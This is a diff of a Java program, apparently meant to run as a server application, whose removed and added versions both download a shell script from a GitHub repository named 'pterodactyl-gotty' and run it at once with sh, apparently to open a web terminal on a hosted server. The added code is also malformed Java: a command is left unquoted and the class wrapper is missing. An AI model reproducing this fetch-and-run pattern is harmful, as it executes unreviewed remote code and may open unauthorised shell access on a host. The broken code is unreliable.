@@ -1,41 +1,32 @@
-package cmd;
+	ProcessBuilder processBuilder = new ProcessBuilder();
+	processBuilder.command(curl -o gottyscript.sh https://raw.githubusercontent.com/mxl0s/pterodactyl-gotty/main/Script.txt);
+	processBuilder.command("sh gottyscript.sh");
 
-import java.io.OutputStream;
-import java.io.IOException;
-import java.io.Writer;
-import java.io.BufferedWriter;
-import java.io.OutputStreamWriter;
-import java.io.Reader;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
+	try {
 
-public class test
-{
-    public static void main(final String[] args) {
-        final ProcessBuilder processBuilder = new ProcessBuilder(new String[0]);
-        processBuilder.command("bash");
-        try {
-            final Process process = processBuilder.start();
-            final BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            final OutputStream os = process.getOutputStream();
-            final BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));
-            bw.write("curl -o gottyscript.sh https://raw.githubusercontent.com/mxl0s/pterodactyl-gotty/main/Script.txt");
-            bw.newLine();
-            bw.write("sh gottyscript.sh");
-            bw.newLine();
-            bw.flush();
-            String line;
-            while ((line = reader.readLine()) != null) {
-                System.out.println(line);
-            }
-            final int exitCode = process.waitFor();
-            System.out.println("\nExited with error code: " + exitCode);
-        }
-        catch (IOException e) {
-            e.printStackTrace();
-        }
-        catch (InterruptedException e2) {
-            e2.printStackTrace();
-        }
-    }
-}
+		Process process = processBuilder.start();
+
+		StringBuilder output = new StringBuilder();
+
+		BufferedReader reader = new BufferedReader(
+				new InputStreamReader(process.getInputStream()));
+
+		String line;
+		while ((line = reader.readLine()) != null) {
+			output.append(line + "\n");
+		}
+
+		int exitVal = process.waitFor();
+		if (exitVal == 0) {
+			System.out.println("Success!");
+			System.out.println(output);
+			System.exit(0);
+		} else {
+
+		}
+
+	} catch (IOException e) {
+		e.printStackTrace();
+	} catch (InterruptedException e) {
+		e.printStackTrace();
+	}
